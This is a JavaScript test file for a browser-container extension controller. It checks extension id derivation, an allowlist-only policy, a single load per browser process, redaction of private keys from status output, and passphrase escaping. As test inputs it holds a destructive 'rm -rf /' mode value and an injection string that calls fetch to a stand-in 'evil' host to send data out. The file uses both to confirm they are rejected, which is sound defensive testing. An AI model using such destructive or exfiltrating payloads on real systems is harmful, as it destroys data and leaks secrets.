// W9 (custody-isolation 2026-10-03): browsercontainer/podkey-ctl.js.
//
// Properties under test:
//   - the extension id is derived from the in-image path exactly as Chrome derives
//     an unpacked extension's id (no manifest `key`), and the managed policy's
//     allowlist names that same id;
//   - Podkey is loaded exactly once per Chrome process: a reload in the same process
//     clears chrome.storage.session, i.e. it would silently lock an unlocked key;
//   - status output carries only state / public key / did, never anything else the
//     extension returns;
//   - the passphrase for `unlock` is embedded as a JSON string literal, so no
//     passphrase can break out of the evaluated expression.
// Run: node --test tests/browsercontainer/podkey-ctl.test.cjs
'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const REPO = path.resolve(__dirname, '../..');
const ctl = require(path.join(REPO, 'browsercontainer/podkey-ctl.js'));

test('extension id follows Chrome\'s unpacked-path derivation', () => {
  // Observed from Chrome beta 151 / Chromium 150 in the live sidecar (2026-10-03):
  // Extensions.loadUnpacked('/tmp/w9probe/podkey') -> oagjkoenbmilmaccdgfmegcnoeohdjhf.
  assert.equal(ctl.extensionIdForPath('/tmp/w9probe/podkey'), 'oagjkoenbmilmaccdgfmegcnoeohdjhf');
  assert.equal(ctl.DEFAULT_EXT_DIR, '/opt/browsercontainer/extensions/podkey');
  assert.equal(ctl.extensionIdForPath(ctl.DEFAULT_EXT_DIR), 'cakgjkgiodcdhecnnfhmcfphjkknfjkd');
  assert.equal(ctl.PODKEY_ID, 'cakgjkgiodcdhecnnfhmcfphjkknfjkd');
});

test('managed policy allowlists exactly the Podkey id and blocks everything else', () => {
  const policy = JSON.parse(fs.readFileSync(path.join(REPO, 'browsercontainer/policies/podkey-only.json'), 'utf8'));
  assert.deepEqual(policy.ExtensionInstallBlocklist, ['*']);
  assert.deepEqual(policy.ExtensionInstallAllowlist, [ctl.PODKEY_ID]);
});

test('load decision: once per Chrome process, never in flag mode', () => {
  const d = ctl.decideLoad;
  assert.equal(d({ mode: 'cdp', browserKey: null, lastLoadedKey: null }), 'wait');
  assert.equal(d({ mode: 'cdp', browserKey: 'ws://b/1', lastLoadedKey: null }), 'load');
  assert.equal(d({ mode: 'cdp', browserKey: 'ws://b/1', lastLoadedKey: 'ws://b/1' }), 'skip');
  assert.equal(d({ mode: 'cdp', browserKey: 'ws://b/2', lastLoadedKey: 'ws://b/1' }), 'load');
  // Chromium loads it from --load-extension; a CDP reload there would clear the session.
  assert.equal(d({ mode: 'flag', browserKey: 'ws://b/1', lastLoadedKey: null }), 'skip');
  assert.equal(d({ mode: 'none', browserKey: 'ws://b/1', lastLoadedKey: null }), 'skip');
  assert.equal(d({ mode: undefined, browserKey: 'ws://b/1', lastLoadedKey: null }), 'skip');
});

test('loaded-for state survives a loader restart (no reload of a live browser)', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'podkey-ctl-'));
  const f = path.join(dir, 'loaded-for');
  assert.equal(ctl.readState(f), null);
  ctl.writeState(f, 'ws://127.0.0.1:9222/devtools/browser/abc');
  assert.equal(ctl.readState(f), 'ws://127.0.0.1:9222/devtools/browser/abc');
  assert.equal(ctl.decideLoad({ mode: 'cdp', browserKey: ctl.readState(f), lastLoadedKey: ctl.readState(f) }), 'skip');
  fs.rmSync(dir, { recursive: true });
});

test('load mode file is read strictly', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'podkey-ctl-'));
  const f = path.join(dir, 'mode');
  assert.equal(ctl.readMode(f), 'none');
  for (const m of ['cdp', 'flag', 'none']) { fs.writeFileSync(f, `${m}\n`); assert.equal(ctl.readMode(f), m); }
  fs.writeFileSync(f, 'rm -rf /\n');
  assert.equal(ctl.readMode(f), 'none');
  fs.rmSync(dir, { recursive: true });
});

test('status is reduced to state, public key and did', () => {
  const pk = 'a'.repeat(64);
  assert.deepEqual(ctl.sanitiseStatus({ state: 'unlocked', exists: true, publicKey: pk, did: `did:nostr:${pk}`, privateKey: 'b'.repeat(64) }),
    { state: 'unlocked', publicKey: pk, did: `did:nostr:${pk}` });
  assert.deepEqual(ctl.sanitiseStatus({ state: 'none', exists: false }), { state: 'none', publicKey: null, did: null });
  assert.deepEqual(ctl.sanitiseStatus({ error: 'x is not allowed' }), { state: 'error', error: 'x is not allowed', publicKey: null, did: null });
  // A non-hex "publicKey" is never echoed.
  assert.equal(ctl.sanitiseStatus({ state: 'locked', publicKey: 'nsec1zzz' }).publicKey, null);
  assert.equal(ctl.sanitiseStatus(undefined).state, 'error');
});

test('unlock expression embeds the passphrase as an inert JSON literal', () => {
  const nasty = '"); fetch("http://evil/"+x); (" `${1}`';
  const expr = ctl.unlockExpression(nasty);
  assert.ok(expr.includes(JSON.stringify(nasty)));
  assert.ok(expr.includes("type: 'UNLOCK_VAULT'"));
  // The literal round-trips: the only string constant in the call is the passphrase.
  const m = expr.match(/passphrase: ("(?:[^"\\]|\\.)*")/);
  assert.equal(JSON.parse(m[1]), nasty);
});

test('status/pubkey/unlock expressions only use extension-UI message types', () => {
  assert.ok(ctl.statusExpression().includes("type: 'GET_KEYPAIR_STATUS'"));
  assert.ok(!/IMPORT_KEYPAIR|GENERATE_KEYPAIR|SET_SESSION_KEY/.test(ctl.statusExpression() + ctl.unlockExpression('x')));
});
